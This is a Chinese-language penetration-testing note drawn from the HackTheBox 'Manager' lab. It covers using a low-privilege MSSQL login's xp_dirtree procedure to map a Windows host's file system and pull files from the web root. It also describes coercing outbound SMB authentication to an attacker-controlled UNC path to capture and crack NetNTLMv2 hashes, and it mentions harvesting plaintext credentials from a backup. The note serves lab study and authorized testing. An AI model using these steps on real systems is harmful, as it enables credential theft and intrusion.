# 低权 MSSQL 的信息面：CONNECT SQL 下限下把文件系统当信息源

> 沉淀自 HTB-Manager（2026-10-16；Windows Server 2019 17763 域控 + SQL Server 2019 RTM `SQLEXPRESS` + IIS 10）。适用于：**拿到一个只有 `CONNECT SQL` / `VIEW ANY DATABASE` 的登录**（或 Windows 登录在库里被映射成 `guest`），数据面读不到东西，但实例仍可当信息源。
> 关联：`xp_dirtree` 的另一半用法（UNC 强制认证抓 NetNTLMv2）见 `ad-post-compromise.md` §2；`ERRORLOG` 里的口令见同档 §7.3；域环境匿名枚举与凭据验证见 `ad-initial-access.md` §1.2、§2.3。
> **仅限授权测试**：列目录为只读行为；§5 的 UNC 强制认证会向外部发起认证，属探测动作，勿在非授权环境执行。

---

## 0. 一句话

数据面走不通时不要收手：**扩展存储过程的执行权不体现在权限表里**，`xp_dirtree` 这类过程对 `public` 开放（实测 `guest` 身份即可执行），能以 SQL 服务账户的权限把目标主机的目录树读出来，再借 web 根把"文件名"变成"可下载的文件"。

## 1. 入场与权限边界（三条查询，一次看清）

```bash
# 集成（Windows）认证入场；若实例禁用了 SQL 登录、只允许集成认证，不加 -windows-auth 会只报一句 Login failed，看不出真实原因
impacket-mssqlclient <domain>/<user>:<pass>@<target> -windows-auth
# 已持有 ccache 时改用 Kerberos：impacket-mssqlclient -k -no-pass <domain>/<user>@<target>
```

进来之后三条查询把边界量清楚：

```sql
SELECT SYSTEM_USER, SUSER_SNAME(), IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;
SELECT name, state_desc FROM sys.databases;
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

| 观测 | 判读 |
|---|---|
| 提示符为 `SQL (DOMAIN\user  guest@master)>` | 该登录在 `master` 里没有数据库用户，落到 `guest`——最低档 |
| `is_sysadmin = 0` | 非 sysadmin |
| `sys.databases` 只有 `master/tempdb/model/msdb` | **没有业务库**，数据面没有可读内容 |
| `fn_my_permissions` 仅 `CONNECT SQL` + `VIEW ANY DATABASE` | public 下限：`xp_cmdshell`、`OPENROWSET(BULK)`、备份数据库全部不可用 |

判据要点：`sys.databases` 与 `fn_my_permissions` 一起看才下结论——单看数据库清单可能只是"没权限看到业务库"。

## 2. 扩展存储过程：权限表里看不见的那部分能力

| 过程 | 作用 | 前提 |
|---|---|---|
| `xp_dirtree '<路径>', <depth>, <file>` | **列目录树**（含文件名），返回三列结果集 | 实测 `guest` 身份即可执行（机制上该过程的执行权默认授予 `public`） |
| `xp_fileexist '<路径>'` | 探存在与类型（通行说法是回三个 INT：存在 / 是目录 / 父目录存在；本档只做了机制性推断，**未实测**） | 同族过程，权限模型同上（未实测） |
| `xp_subdirs '<路径>'` | 只列子目录 | 同族过程，权限模型同上（本档未单独实测） |
| `OPENROWSET(BULK '<路径>', SINGLE_BLOB)` | **读文件内容** | 需 `ADMINISTER BULK OPERATIONS`（sysadmin 级），低权无戏 |

参数语义：第二个参数 `depth` 是往下钻的层数（给 1 只列直接子项，返回行的 `depth` 列全是 1，可据此确认语义）；第三个参数 `file = 1` 才把文件列进结果，`0` 只给目录。

```sql
-- 盘根布局（先看有哪些安装器自建目录，本例是 C:\SQL2019）
EXEC master..xp_dirtree 'C:\', 1, 0;

-- web 根连文件名一起列
EXEC master..xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
```

**"返回空"不等于"目录是空的"**：`xp_dirtree` 遇到 access denied 是**静默回空集**，与真空目录无法区分。用 `xp_fileexist` 补一刀——按它常见的返回列序（存在 / 是目录 / 父目录存在，本档未实测）判断：首列为 0 即路径不存在；全为 1 说明路径确实存在，此时为空的原因只剩"空目录"或"无读取权限"两种，再拿一个同级已知可读目录做对照即可分辨。

## 3. 客户端解析坑：`Unknown Token` 不是权限问题

impacket 的 `mssqlclient` 在特定行集形态下会打印：

```
[-] Unknown Token 64
```

`Unknown Token %x` 里的数字是**十六进制**（`64` = `0x64`），而 `0x64` 不在 impacket 认识的 TDS 令牌表里（`tds.py` 只处理 `0x81/0xA5/0xA9/0xD1/0xD2/0xE3/0xFD…`）——说明流已错位，把数据字节当成了令牌。

- **触发条件（实测）**：`xp_dirtree 'C:\Windows', 0, 1`（`depth = 0`）。改成 `depth ≥ 1` 即恢复正常，与 `file`（`bit`）列无关。
- **判据**：权限被拒走的是 `ERROR` 令牌，客户端会直接打印 `Access denied / permission denied`；出现 `Unknown Token` 说明**服务端已经把行集发回来了**，问题在客户端解析，别据此判定"权限不够"而放弃这条路。
- **绕法 A**：`depth` 一律给 ≥ 1。
- **绕法 B**（列宽/类型组合仍崩时）：把行集吞进临时表，客户端只收 `DONE` 令牌：

```sql
CREATE TABLE #d (subdirectory NVARCHAR(512), depth INT, isfile BIT);
INSERT INTO #d EXEC master..xp_dirtree 'C:\inetpub\wwwroot', 3, 1;
SELECT * FROM #d ORDER BY depth;
-- 复用：TRUNCATE TABLE #d; 后再 INSERT
```

**归因纪律**：先用"只改一个变量"的最小对比定位（本例：`depth` 0 与 1 各跑一次），不要用一个"看起来合理"的假设（如"`bit` 列导致解析失败"）就下结论并写进笔记。

## 4. 从文件名到文件内容

枚举顺序按收益排：`C:\` 看自定义目录 → `C:\inetpub\wwwroot` → `C:\Users`（深 2 层，避开 AppData 噪音）→ 第 2 步圈出的可疑目录。

- 结果在 **web 根之内** → 直接 HTTP 取，不需要额外权限：
  ```bash
  curl -sS -m 15 -I http://<site>/<相对路径>   # 200 再 -O 落地
  ```
- 结果在 web 根之外 → `xp_dirtree` 只给名字、`OPENROWSET` 无权限，此时要么另找投递通道（可读共享 / 更高权限），要么放弃。

**备份包的坑**：解包后**必须 `ls -la`**。点开头的配置文件（`.old-conf.xml` 之类）会被普通 `ls` 掩盖，实测里面就是一段 LDAP 连接配置、明文写着域账号与口令：

```xml
<access-user><user>raven@<domain></user><password><明文口令></password></access-user>
```

## 5. 同一条命令的另一半：UNC 出站认证

把路径换成 `\\<攻击机>\share`，`xp_dirtree` 就会让 **SQL 服务账户**向外发起 SMB 认证，配 Responder 抓 NetNTLMv2（完整流程见 `ad-post-compromise.md` §2）。

判读分支：

| 抓到的身份 | 结论 |
|---|---|
| `DOMAIN\<域用户>` | 服务跑在域账户下，`hashcat -m 5600` 可破 |
| `HOST$`（机器账户）、`NT AUTHORITY\...` | 服务跑在虚拟账户下，机器账户口令随机，**基本破不动**，换路 |

## 6. 坑清单

- `xp_dirtree` 一律给 `depth ≥ 1`（§3）；`--rid-brute` 那类"区间参数"也别想当然——nxc 收的是整数上限。
- 别对 `xp_cmdshell` 抱有期待：`CONNECT SQL` 下必然 `permission denied`，白跑一次。
- 实例名是 `SQLEXPRESS` 不影响连接方式：本例仍监听 1433，但命名实例也可能走动态端口，先 nmap 确认再连。
- 低权登录能连上**不代表**有独立的 SQL 登录：`SELECT SYSTEM_USER` 回 `DOMAIN\user` 只说明是用集成认证进来的，提示符里的 `guest@<db>` 才是映射到的数据库用户——权限按后者算。

## 7. 来源

- HTB-Manager（本会话实测）：§1 三条判据、§2 `xp_dirtree` 列 web 根、§3 `depth=0` 的 `Unknown Token 0x64` 与其绕法、§4 备份包里的 `.old-conf.xml`。
- HTB-Querier（既有沉淀）：§5 的 `xp_dirtree` UNC → Responder 链路（见 `ad-post-compromise.md` §2 的强制认证表）。
- 过程名与参数语义取自实例实测行为；`OPENROWSET(BULK)` 的权限要求为 SQL Server 既有权限模型（未在本档单独实测）。
